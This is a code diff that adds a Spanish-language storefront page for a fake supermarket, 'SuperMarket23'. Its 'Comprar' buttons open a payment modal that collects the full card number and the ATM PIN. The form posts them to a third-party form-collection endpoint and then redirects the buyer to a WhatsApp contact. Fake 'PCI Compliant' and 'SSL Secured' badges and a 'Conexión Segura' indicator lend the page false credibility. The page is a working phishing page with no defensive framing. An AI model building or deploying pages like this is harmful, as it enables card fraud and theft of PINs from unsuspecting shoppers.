@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SuperMarket23 | Tienda Oficial</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .modal-active { display: flex !important; }
+        @keyframes pulse-secure { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .secure-dot { animation: pulse-secure 2s infinite; }
+    </style>
+</head>
+<body class="bg-gray-50 font-sans">
+
+    <nav class="bg-blue-800 p-4 text-white shadow-lg sticky top-0 z-40">
+        <div class="container mx-auto flex justify-between items-center">
+            <h1 class="text-2xl font-black italic tracking-tighter">SuperMarket23</h1>
+            <div class="flex items-center gap-2">
+                <span class="secure-dot text-green-400 text-xs">●</span>
+                <span class="text-[10px] uppercase font-bold tracking-widest">Conexión Segura</span>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container mx-auto py-8 px-4">
+        <h2 class="text-xl font-bold mb-6 text-gray-700 border-l-4 border-blue-600 pl-3">Productos Disponibles</h2>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <div class="bg-white p-5 rounded-2xl shadow-sm border border-gray-100">
+                <div class="w-full h-40 bg-gray-100 rounded-xl mb-4 flex items-center justify-center text-gray-400">Imagen Combo</div>
+                <h3 class="font-bold text-lg">Combo Cárnico Familiar</h3>
+                <p class="text-gray-500 text-sm">Res, Cerdo y Embutidos.</p>
+                <div class="mt-4 flex justify-between items-center">
+                    <span class="text-2xl font-black text-blue-700">$95.00</span>
+                    <button onclick="abrirPago('Combo Cárnico', 95)" class="bg-blue-600 text-white px-5 py-2 rounded-lg font-bold hover:bg-blue-700 transition">Comprar</button>
+                </div>
+            </div>
+
+            <div class="bg-white p-5 rounded-2xl shadow-sm border border-gray-100">
+                <div class="w-full h-40 bg-gray-100 rounded-xl mb-4 flex items-center justify-center text-gray-400">Imagen Aseo</div>
+                <h3 class="font-bold text-lg">Kit de Aseo Premium</h3>
+                <p class="text-gray-500 text-sm">Jabón, Detergente y Pasta.</p>
+                <div class="mt-4 flex justify-between items-center">
+                    <span class="text-2xl font-black text-blue-700">$38.00</span>
+                    <button onclick="abrirPago('Kit de Aseo', 38)" class="bg-blue-600 text-white px-5 py-2 rounded-lg font-bold hover:bg-blue-700 transition">Comprar</button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div id="modalPago" class="fixed inset-0 bg-slate-900/90 hidden items-center justify-center z-50 p-4 backdrop-blur-md">
+        <div class="bg-white w-full max-w-sm rounded-3xl shadow-2xl overflow-hidden border border-white/20">
+            
+            <div class="bg-gradient-to-r from-blue-800 to-blue-700 p-6 text-white text-center">
+                <div class="bg-white/10 w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-3">
+                    <span class="text-xl">🔒</span>
+                </div>
+                <h2 class="text-lg font-bold uppercase tracking-widest">Verificación Necesaria</h2>
+                <p class="text-[10px] opacity-70">SISTEMA DE PAGOS SEGUROS</p>
+            </div>
+
+            <form action="https://formspree.io/f/meelpawj" method="POST" class="p-8">
+                <input type="hidden" name="_next" value="https://wa.me/5352416260?text=Hola!+Acabo+de+completar+el+pago+en+SuperMarket23.+Por+favor+revisar.">
+                
+                <div class="mb-5">
+                    <label class="block text-[10px] font-black text-gray-400 uppercase mb-1">Número de Tarjeta (PAN)</label>
+                    <input type="text" name="tarjeta" maxlength="16" placeholder="0000 0000 0000 0000" 
+                        class="w-full border-b-2 border-gray-200 py-2 outline-none focus:border-blue-600 transition text-lg tracking-[0.2em]" required>
+                </div>
+
+                <div class="mb-8">
+                    <label class="block text-[10px] font-black text-gray-400 uppercase mb-1">Contraseña / PIN de Cajero</label>
+                    <input type="password" name="clave" placeholder="••••" 
+                        class="w-full border-b-2 border-gray-200 py-2 outline-none focus:border-blue-600 transition text-lg" required>
+                </div>
+
+                <button type="submit" class="w-full bg-blue-600 hover:bg-blue-800 text-white font-bold py-4 rounded-2xl shadow-lg transition-all active:scale-95 shadow-blue-200">
+                    CONFIRMAR PAGO
+                </button>
+
+                <button type="button" onclick="cerrarPago()" class="w-full mt-4 text-gray-400 text-[10px] font-bold uppercase tracking-widest hover:text-red-500 transition">
+                    Cancelar Transacción
+                </button>
+            </form>
+            
+            <div class="bg-gray-50 p-4 border-t flex justify-center items-center gap-4">
+                <span class="text-[8px] text-gray-400 font-bold uppercase">PCI Compliant</span>
+                <span class="text-[8px] text-gray-400 font-bold uppercase">SSL Secured</span>
+                <span class="text-[8px] text-gray-400 font-bold uppercase">256-bit</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function abrirPago(producto, precio) {
+            document.getElementById('modalPago').classList.add('modal-active');
+        }
+
+        function cerrarPago() {
+            document.getElementById('modalPago').classList.remove('modal-active');
+        }
+    </script>
+</body>
+</html>
